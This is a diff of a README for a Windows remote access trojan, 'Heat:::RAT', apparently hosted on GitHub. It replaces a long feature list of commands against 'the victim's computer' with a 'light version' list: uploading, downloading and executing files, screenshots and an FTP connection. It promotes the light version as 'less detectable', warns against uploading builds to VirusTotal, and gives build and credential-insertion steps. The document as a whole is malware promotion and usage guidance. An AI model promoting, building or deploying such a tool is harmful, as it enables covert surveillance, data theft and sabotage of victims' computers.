@@ -1,20 +1,20 @@
 <a id ="up"></a>
-[![logo](files_for_GitHub/LOGO.png)](https://github.com/Nick-Vinesmoke/Heat-RAT/releases/tag/HeatRAT_v3.0.3)
+[![logo](for_readme/LOGO.png)](https://github.com/Nick-Vinesmoke/Heat-RAT/releases/tag/HeatRAT_v3.0.3)
 <img src="https://img.shields.io/badge/C%2B%2B-00599C?style=for-the-badge&logo=c%2B%2B&logoColor=white">
 <img src="https://img.shields.io/badge/C-00599C?style=for-the-badge&logo=c&logoColor=white">
 <img src="https://img.shields.io/badge/Visual_Studio-5C2D91?style=for-the-badge&logo=visual%20studio&logoColor=white">
 <img src="https://img.shields.io/badge/VSCode-0078D4?style=for-the-badge&logo=visual%20studio%20code&logoColor=white">
 <img src="https://img.shields.io/badge/build-passing-76B900?style=for-the-badge&logo=&logoColor=whit">
-<img src="https://img.shields.io/badge/tests-99/100-76B900?style=for-the-badge&logo=&logoColor=whit">
+<img src="https://img.shields.io/badge/tests-96/100-76B900?style=for-the-badge&logo=&logoColor=whit">
 <img src="https://img.shields.io/badge/code quality-A-76B900?style=for-the-badge&logo=&logoColor=whit">
 <img src="https://img.shields.io/badge/license-MIT-blue?style=for-the-badge&logo=&logoColor=whit">
-<img src="https://img.shields.io/badge/Heat:::RAT-v3.0.3-blue?style=for-the-badge&logo=&logoColor=whit">
+<img src="https://img.shields.io/badge/Heat:::RAT-v4.0.0-blue?style=for-the-badge&logo=&logoColor=whit">
 <img src="https://img.shields.io/badge/Microsoft-666666?style=for-the-badge&logo=microsoft&logoColor=white">
 <img src="https://img.shields.io/badge/Windows-0078D6?style=for-the-badge&logo=windows&logoColor=white">
 
-[RAT+STEALER](https://github.com/Nick-Vinesmoke/Heat-RAT/releases/tag/HeatRAT_v3.0.3)
+Light version of [HeatRAT](https://github.com/Nick-Vinesmoke/Heat-RAT/releases/tag/HeatRAT_v3.0.3)
 ---
-🔭Program for remote control of windows computers via cmd. Written in C++
+🔭Program for remote control of windows computers. Written in C++
 
 ⭐Please, star this repo if it was helpful⭐
 
@@ -30,130 +30,34 @@ __Don't upload builded rat to Virustotal__. The more often you upload it, the mo
 
 ---
  
- 
- 
 ### 📠Functions:
 
-> !screenshot"
-> - do a screenshot and sent to you
-
-> "!photoWebcam"
->- do a photo from the webcam and sent to you
-
-> "!openLink"
->- open the link on the victim's computer
-
-> "!directory"
->- get a path to rat virus
-
-> "!directoryContent"
->- get all files name placed in the same directory with virus
-
-> "!createFolder"
->- create a folder on the victim's computer
-
-> "!deleteFolder"
->- delete a folder on the victim's computer
-
-> "!deleteFile"
->- delete a file on the victim's computer
-
-> downloadFile"
->- download the file to the victim's computer
-
-> "!video"
->- rec the video from the victim's webcam, duration in seconds
-
-> "!audio"
->- rec the audio from the victim's microphone, duration in seconds
-
-> "!runFile"
->- run the file on the victim's computer
-
-> "!volume"
->- change the volume on the victim's computer
-
-> "!turnOff"
->- shutdown the victim's computer
-
-> "!restart"
->- restart the victim's computer
-
-> "!alt+f4"
->- alt+f4 =)
-
-> "!crazyCursor"
->- change mouse buttons
-
-> "!wallpaper"
->- change the wallpaper on the victim's compute
-
-> "!move"
->- move the virus to the directory
-
-> "!rename"
->- rename the virus
-
-> "!encrypt"
->- encrypt file on the victim's computer
-
-> "!decrypt"
->- decrypt file on the victim's computer
-
-> "!logs"
->- grab and send logs from the victim's computer
-
-> "!screamer"
->- screamer :O
-
-> "!moveFile"
->- move the file to the directory on victim's computer
-
-> "!lock"
->- #winlock ('._.')
-
-> "!downloadFolder"
->- download folder to the victim's computer
-
-> "!processes"
->- show process list
-
-> "!closeProces"
->- close process
-
-> "!banTM"
->- ban task manager
-
-> "!message"
->- show text message
-
-> "!CMDbomb"
->- booom
+- Upload files to the victim's PC
+- Download files  to the victim's PC
+- Execute any files on the victim's PC
+- Take a screenshot of  the victim's PC
+- Make a connection with the FTP-Server
 
 ---
  
- 
+### 📋Light version difference
+
+- It's faster than the full version
+- It's lightweight than the full version
+- It contains fewer functions
+- It's less detectable than the full version
+
+---
  
 ### 🔨Building
 
-![image](files_for_GitHub/Screenshot_1.png)
-
-Than press Ctrl+Shift+B. You'll find builted control panel in the folder release. After that, place .exe file like in this photo.
-
-![image](files_for_GitHub/Screenshot_7.png)
+In case it's the light version, it's pointless to make a builder for it. Firstly you need to go into `main.cpp` file and insert your data in line number 38: `RemoteAccess ra = RemoteAccess("host", "username", "password");`. Then to build it manually you only need to have a Visual Studio installed with C++. I recommend you build it like release: 64/86. After the building finishes you'll find the build file in `x64\Release` or `x86\Release`.
 
 ---
- ### ⚙How to set up Heat:::RAT
- This is a fairly large topic, so in order not to stuff it into the readme, [I made a separate site for it.](https://sites.google.com/view/heat-rat)
- 
- ---
-### 🎴Overview
 
-![image](files_for_GitHub/Screenshot_4.png)
+### 📡FTP server set up
 
-![image](files_for_GitHub/Screenshot_5.png)
-
-![image](files_for_GitHub/Screenshot_6.png)
+How to set up your FTP server, [read here](https://www.serv-u.com/ftp-server-windows/server-setup#:~:text=Navigate%20to%20Start%20%3E%20Control%20Panel%20%3E%20Administrative%20Tools%20%3E%20Internet%20Information,click%20on%20Add%20FTP%20Site%20.&text=In%20the%20Binding%20and%20SSL,IP%20address%20of%20the%20server.)
 
 ---
 
